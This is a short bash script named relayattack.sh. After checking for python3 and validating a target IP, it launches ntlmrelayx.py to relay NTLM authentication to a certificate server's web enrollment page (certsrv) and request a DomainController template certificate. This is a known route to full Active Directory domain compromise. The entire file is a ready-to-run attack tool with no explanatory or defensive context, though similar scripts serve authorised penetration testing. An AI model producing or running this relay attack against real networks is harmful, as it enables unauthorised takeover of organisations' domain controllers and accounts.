#!/bin/bash

# Function to display usage
usage() {
    echo -e "\nUsage: relayattack.sh <target IP>"
    echo -e "Example: ./relayattack.sh 10.2.105.22\n"
}

# Check for required command
if ! command -v python3 &> /dev/null; then
    echo "Error: python3 is not installed."
    exit 1
fi

# Validate input parameters
if [ $# -ne 1 ]; then
    usage
    exit 1
fi

# Assign input to variable
TARGET_IP="$1"

# Validate IP address format
if ! echo "$TARGET_IP" | grep -E -q "^([0-9]{1,3}\.){3}[0-9]{1,3}$"; then
    echo "Invalid IP address format."
    usage
    exit 1
fi

# Run ntlmrelayx.py with specified options
echo "Running ntlmrelayx.py against $TARGET_IP"
python3 /usr/local/bin/ntlmrelayx.py -debug -smb2support --target "http://$TARGET_IP/certsrv/default.asp" --template DomainController --adcs

echo "Script execution completed."
